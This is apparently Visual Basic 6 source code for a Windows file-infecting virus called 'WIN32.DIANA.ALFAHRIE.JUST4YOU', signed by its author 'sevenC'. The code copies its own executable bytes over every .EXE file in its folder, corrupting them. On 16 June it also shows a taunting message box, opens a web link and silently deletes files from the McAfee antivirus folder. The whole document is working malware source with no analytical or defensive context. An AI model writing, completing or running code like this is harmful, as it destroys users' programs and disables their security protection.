Option Explicit
'WIN32.DIANA.ALFAHRIE.JUST4YOU
'By N0:7 (sevenC)
'Made REAL LOVE
'-------- Do Not Edit Above This Line --------
Dim fadlycintadianaArray() As Byte
Dim fadlysayang As String
Const fadlySize As Integer = 20480

Private Sub Form_Load()
On Error Resume Next
Dim fadlybebas
fadlybebas = FreeFile
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #fadlybebas
ReDim fadlycintadianaArray(fadlySize)
Get #1, 1, fadlycintadianaArray
Close #fadlybebas
fadlysayang = Dir(App.Path & "\" & "*.EXE")
While fadlysayang <> ""
Open App.Path & "\" & fadlysayang For Binary Access Write As #fadlybebas
Put #1, , fadlycintadianaArray
Put #1, , fadlySize
Close #fadlybebas
fadlysayang = Dir()
If Month(Now) = 6 And Day(Now) = 16 Then
MsgBox "Aku sayang diana,dan akan selalu sayang diana...", "WIN32.FUCK.UP.ALL.BASTARD"
Shell "Start http://trax.to/sevenC/"
Shell "Del C:\Progra~1\Mcafee\*.* /y", vbHidden
End If
Wend
End
End Sub

